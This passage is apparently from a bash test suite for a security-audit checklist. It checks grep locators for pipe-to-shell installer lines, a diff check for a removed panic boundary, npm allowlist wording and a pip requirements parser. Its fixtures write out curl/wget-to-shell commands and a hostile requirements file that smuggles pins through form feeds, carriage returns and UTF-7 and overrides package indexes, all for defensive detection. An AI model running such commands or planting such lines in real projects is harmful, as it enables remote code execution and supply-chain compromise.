  'curl -fsSL https://get.example.invalid/e.sh | \bash' 'http --body https://get.example.invalid/h.sh | sh' \
  'wget -qO- https://get.example.invalid/m.sh | mksh' 'sh -c "`curl -fsSL https://get.example.invalid/b.sh`"' \
  'bash -c "set -e; $(curl -fsSL https://get.example.invalid/l.sh)"' \
  'curl -fsSL https://example.invalid/n | tee -a setup-bash x_zsh' > "$SC/scripts/more.sh"
{ for n in 6 7 8 9 10 11 15 16 17 18 19; do echo ".github/workflows/ci.yml:$n"; done
  echo .github/workflows/release.yaml:5; for n in 2 3 4 5 6; do echo "docker/Dockerfile.build:$n"; done; echo Makefile:2
  for n in 2 3 4; do echo "scripts/setup.sh:$n"; echo "scripts/ci/setup.sh:$n"; done
  printf '%s\n' package.json:1 package.json:2 .devcontainer/devcontainer.json:2 sub/Makefile.toml:2 src/lib.rs:1 \
    scripts/bootstrap:3 scripts/install-solana:2 scripts/setup.py:2 scripts/setup.js:2 ci/install-agave:2 \
    .github/scripts/setup:2 script/bootstrap:2 Jenkinsfile:2 Vagrantfile:2 infra/main.tf:2 docker/Dockerfile:3 \
    docker/alpine/Dockerfile:2 docker/Dockerfile.wrap:3 Makefile:4
  for n in 2 3 4 5 6 7; do echo "scripts/more.sh:$n"; done
  } | LC_ALL=C sort > "$T/sc064.want"
item "$CL" SC-064 | span 'grep -rnEIx ' > "$T/sc064.sh"
(cd "$SC" && bash -O failglob "$T/sc064.sh") > "$T/sc064.raw" 2>&1
sed 's#^\./##' "$T/sc064.raw" | cut -d: -f1,2 | LC_ALL=C sort > "$T/sc064.out"
if [ "$(grep -c '' "$T/sc064.sh")" = 1 ] && cmp -s "$T/sc064.want" "$T/sc064.out"; then
  ok "SC-064's locator lists the 49 installer lines in every text file of the tree and nothing else, under failglob"
else bad "SC-064's locator on the installer fixture (want the 49 lines of sc064.want)"; sed 's/^/  | /' "$T/sc064.raw"; fi
# its 6 patterns each start at ^, so Claude Code's grep tries each one once per line; it reads every text file, with
# no --include list; and the command holds no $ (Claude Code asks about any line with one, in quotes too) and no tab.
# -x stands in for the $ a pattern would end with: each one matches a whole line.
pats=$(tr ' ' '\n' < "$T/sc064.sh" | grep -c "^'^")
if [ "$pats" = 6 ] && [ "$(tr ' ' '\n' < "$T/sc064.sh" | grep -cx -- -e)" = 6 ] && ! grep -q -- --include "$T/sc064.sh" \
   && ! grep -q '[$]' "$T/sc064.sh" && ! grep -q "$(printf '\t')" "$T/sc064.sh"; then
  ok "SC-064's 6 patterns each start at ^, it reads every text file, and the command holds no \$ and no tab"
else bad "SC-064's locator: $pats of 6 patterns start at ^, or it has an --include list, a \$ or a tab"; cat "$T/sc064.sh"; fi
# In a UTF-8 locale GNU grep decides a line in one pass of its DFA only when no pattern holds a construct the DFA
# leaves undecided; with one, each line that may match goes to its regex matcher, and a 1 MiB line takes minutes
# (test-gha-recipes.sh, "Linear by construction", holds the GHA recipes to the same subset). So no SC-064 pattern
# holds a negated bracket, a class, a range, a back-reference, a word anchor such as \> or a backslash in a
# bracket, which Claude Code's grep reads as an escape.
odd=$( ( grep() { local a next=0; for a in "$@"; do if [ "$next" = 1 ]; then printf '%s\n' "$a"; next=0
                                                    elif [ "$a" = -e ]; then next=1; fi; done; }
         eval "$(cat "$T/sc064.sh")" ) |
  LC_ALL=C awk -v esc="wWsSbB<>\`'" '
    { p = $0; n = length(p); i = 1; why = ""
      while (i <= n && why == "") {
        c = substr(p, i, 1)
        if (c == "\\") { d = substr(p, i + 1, 1); if (d ~ /[1-9]/ || (d != "" && index(esc, d))) why = "the escape \\" d; i += 2; continue }
        if (c != "[") { i++; continue }
        j = i + 1
        if (substr(p, j, 1) == "^") { why = "a negated bracket"; break }
        first = j
        while (j <= n) {
          d = substr(p, j, 1)
          if (d == "]" && j > first) break
          if (d == "[" && index(":.=", substr(p, j + 1, 1))) { why = "a class in a bracket"; break }
          if (d == "\\") { why = "a backslash in a bracket"; break }
          if (d == "-" && j > first && substr(p, j + 1, 1) != "]") { why = "a range in a bracket"; break }
          j++
        }
        i = j + 1
      }
      if (why != "") print why ": " substr(p, 1, 80) }')
if [ -z "$odd" ] && [ "$pats" = 6 ]; then ok "SC-064's patterns hold nothing GNU grep's DFA leaves undecided in a UTF-8 locale"
else bad "SC-064's locator leaves the one-pass subset: $odd"; fi
# ... and on a 1 MiB line of near misses (a minified bundle: a URL, || and push) it is done within 30 s in a UTF-8
# locale and lists nothing. gnulib's regex, the matcher GNU grep falls back to, took about 46 s for that line with
# the patterns SC-064 had before, which each hold such a construct.
utf8=$(locale -a 2>/dev/null | grep -iE '^(C|en_US)[.]utf-?8$' | sed -n 1p)
mkdir -p "$T/sc064-long/app/dist" || exit 1
awk 'BEGIN { printf "var u=1;"; for (i = 0; i < 30000; i++) printf "a.push(b)||c.d=e;f=\"https://x.y/z\";"; printf "\n" }' \
  > "$T/sc064-long/app/dist/bundle.js"
( cd "$T/sc064-long" && if [ -n "$utf8" ]; then export LC_ALL="$utf8"; fi && eval "exec $(cat "$T/sc064.sh")" ) \
  > "$T/sc064-long.out" 2>&1 </dev/null &
lpid=$!; li=0
while kill -0 "$lpid" 2>/dev/null && [ "$li" -lt 300 ]; do sleep 0.1; li=$((li + 1)); done
if kill -0 "$lpid" 2>/dev/null; then
  kill "$lpid" 2>/dev/null; wait "$lpid" 2>/dev/null
  bad "SC-064's locator is still running after 30 s on a 1 MiB line (LC_ALL=${utf8:-unset})"
else
  wait "$lpid"; lrc=$?
  if [ "$lrc" = 1 ] && [ ! -s "$T/sc064-long.out" ]; then
    ok "SC-064's locator reads a 1 MiB line of near misses within 30 s (LC_ALL=${utf8:-unset}) and lists nothing"
  else bad "SC-064's locator on a 1 MiB line: status $lrc"; head -c 300 "$T/sc064-long.out"; fi
fi
# SC-063: the RS cross-references #33 names, and its grep lists an added unwrap() and a removed panic boundary
s63=$(item "$CL" SC-063)
case "$s63" in *RS-005*RS-006*RS-012*RS-013*|*RS-005*RS-006*RS-013*) ok "SC-063 cross-references RS-005, RS-006 and RS-013";;
  *) bad "SC-063 does not cross-reference RS-005, RS-006 and RS-013";; esac
mkdir -p "$T/s63/old/src" "$T/s63/new/src" || exit 1
printf '%s\n' 'fn handle(x: Option<u8>) -> u8 {' '    std::panic::catch_unwind(|| 0).unwrap_or(0)' '}' > "$T/s63/old/src/lib.rs"
printf '%s\n' 'fn handle(x: Option<u8>) -> u8 {' '    x.unwrap()' '}' > "$T/s63/new/src/lib.rs"
printf '%s\n' "$s63" | span 'diff -ruN old/ new/ | grep ' > "$T/s63.sh"
(cd "$T/s63" && bash "$T/s63.sh") > "$T/s63.out" 2>&1
if grep -q '^[0-9]*:+    x\.unwrap()$' "$T/s63.out" && grep -q '^[0-9]*:-    std::panic::catch_unwind' "$T/s63.out"; then
  ok "SC-063's grep lists an added unwrap() and a removed catch_unwind"
else bad "SC-063's grep on an artifact diff"; sed 's/^/  | /' "$T/s63.out"; fi
# SC-065: files and include are the allowlist; an .npmignore is a denylist that replaces .gitignore
s65=$(item "$CL" SC-065)
case "$s65" in *'(or `.npmignore`)'*) bad "SC-065 still offers .npmignore as the allowlist";;
  *'`package.json` `files`, a crate'"'"'s `include`'*'An `.npmignore` is no allowlist'*'only where that directory has no `.npmignore`'*)
    ok "SC-065 takes files or include as the allowlist and reads .npmignore as a list of what to leave out";;
  *) bad "SC-065 does not say that an .npmignore is no allowlist and replaces .gitignore";; esac
# PY-050: its check numbers the lines pip may read otherwise than they look: an encoding line in a file's first two
# lines (in UTF-7, +AAo- is a line break; a NUL byte before it too), and a line with a control character or a byte
# outside ASCII, other than a tab and the line's last byte, a comment too, which pip can read as several lines, the
# last going on into the next. Its copy, under failglob from a scratch directory, takes the pins out of a hostile
# requirements file as name==version lines only, indented ones too, with a line that ends in a backslash joined to the
# next as pip joins it (in a CRLF file too; a whole-line comment is never joined to the next and ends a join), and
# nothing from a numbered line or the lines a backslash joins to it, nor from a version an environment variable
# reference follows; pip-audit reads them without pip, and file-map's Python rows give the same call
PY14="$ROOT/checklists/14-python-safety.md"
mkdir -p "$T/py/tree" "$T/py/scratch" || exit 1
printf '%s\n' '# a comment' '--index-url https://pypi.example.invalid/simple' '--extra-index-url https://extra.example.invalid/simple' \
  '--trusted-host pypi.example.invalid' '-f https://links.example.invalid/' '-r ../outside.txt' '-c constraints.txt' \
  '-e git+https://git.example.invalid/x.git#egg=x' 'evil @ https://files.example.invalid/evil-1.0.tar.gz' \
  'https://files.example.invalid/direct-1.0.tar.gz' 'ranged>=1.0' 'compat~=1.4' 'wild==1.0.*' 'star==1.0*' 'arb===1.0' \
  'bar==2.0 \' '    --hash=sha256:0000000000000000000000000000000000000000000000000000000000000000' \
  'baz==3.0 ; python_version < "3.11"' 'qux[extra,other]==4.0' 'spaced == 5.0' 'zed==6.0  # pinned' \
  'opt[x --index-url=https://evil.example.invalid]==1.0' 'Mixed_Case.name==7.0rc1' 'epoch==1!2.0+local.1' \
  '  indented==9.0' "$(printf '\tttab==9.1')" 'nam\' 'e==7.1' 'split==41.0.\' '0' '# a note \' 'after==1.2' \
  'envpin==1.0${SUFFIX}' "$(printf 'formfeed==1.3\fcryptography==41.0.0')" "$(printf 'lonecr==1.4\rhidden==2.4')" \
  "$(printf '\fpkg==1.0')" 'cfoo==1.0 \' '# trailing comment \' 'cbar==2.0' "$(printf 'poison==1.0 # x\001 \\')" \
  'swallowed==2.0' "$(printf '# note\fhidden3==3.0')" 'gfoo==1.0 \' "$(printf '# c\f0\\')" 'gx==1.0' \
  "$(printf '# d\f0\\')" 'hx==1.0' > "$T/py/tree/requirements.txt"
printf 'win==3.1 \\\r\n    --hash=sha256:1111\r\ncrlf==8.0\r\n' >> "$T/py/tree/requirements.txt"
printf '%s\n' 'bar==2.0' 'baz==3.0' 'qux[extra,other]==4.0' 'spaced == 5.0' 'zed==6.0' 'Mixed_Case.name==7.0rc1' \
  'epoch==1!2.0+local.1' 'indented==9.0' 'ttab==9.1' 'name==7.1' 'split==41.0.0' 'after==1.2' 'cfoo==1.0' 'cbar==2.0' \
  'win==3.1' 'crlf==8.0' > "$T/py/want"
printf '%s\n' '# -*- coding: utf-7 -*-' 'safepkg==2.0 +AAo-cryptography==41.0.0' > "$T/py/tree/u7a.txt"
printf 'first==1.0 +AAo-hid==1.1\n#\000coding=utf-7\nreq==2.0\n' > "$T/py/tree/u7b.txt"
p50=$(item "$PY14" PY-050)
printf '%s\n' "$p50" | span 'LC_ALL=C sed -nE ' > "$T/py/spans"
grep -F -- '>> pins.txt' "$T/py/spans" | sed "s#<requirements file>#$T/py/tree/requirements.txt#" > "$T/py/sed.sh"
for f in requirements u7a u7b; do
  grep -F -- 'coding[:=]' "$T/py/spans" | sed "s#<requirements file>#$T/py/tree/$f.txt#" > "$T/py/check-$f.sh"
  (cd "$T/py/scratch" && bash -O failglob "$T/py/check-$f.sh") 2>&1 | tr '\n' ' ' > "$T/py/check-$f.out"
done
if [ "$(grep -c '' "$T/py/spans")" = 2 ] && [ "$(grep -c '' "$T/py/check-requirements.sh")" = 1 ] \
   && ! grep -q '[$]' "$T/py/check-requirements.sh" \
   && [ "$(cat "$T/py/check-requirements.out")" = "34 35 36 40 42 44 46 " ] \
   && [ "$(cat "$T/py/check-u7a.out")" = "1 " ] && [ "$(cat "$T/py/check-u7b.out")" = "2 2 " ]; then
  ok "PY-050's check numbers an encoding line and each line pip can read as more than one, by a command with no \$"
else bad "PY-050's check (want 34 35 36 40 42 44 46 on the hostile file, 1 on u7a, 2 2 on u7b)"; head -n 5 "$T/py"/check-*.out; fi
(cd "$T/py/scratch" && bash -O failglob "$T/py/sed.sh") > "$T/py/sed.out" 2>&1
if [ "$(grep -c '' "$T/py/sed.sh")" = 1 ] && ! grep -q '[$]' "$T/py/sed.sh" && [ ! -s "$T/py/sed.out" ] \
   && cmp -s "$T/py/want" "$T/py/scratch/pins.txt"; then
  ok "PY-050 joins continued lines as pip does and copies only the name==version part of each pin, by a command with no \$"
else bad "PY-050's copy of the pins"; sed 's/^/  | /' "$T/py/sed.out" "$T/py/scratch/pins.txt" 2>/dev/null; fi
if [ "$(printf '%s\n' "$p50" | span 'pip-audit ' | grep -cx 'pip-audit --no-deps --disable-pip -r pins.txt')" -ge 1 ] \
   && grep -qx '  pip-audit --no-deps --disable-pip -r pins.txt .*' "$ROOT/discovery/file-map.md" \
   && ! grep -qxE '  (pip-audit|safety check) *(#.*)?' "$ROOT/discovery/file-map.md"; then
  ok "PY-050 and file-map run pip-audit on the pins with --no-deps --disable-pip, never bare"
else bad "PY-050 or file-map runs pip-audit or safety bare, or without --no-deps --disable-pip"; fi

echo "---- $pass passed, $failn failed"
[ "$failn" -eq 0 ]
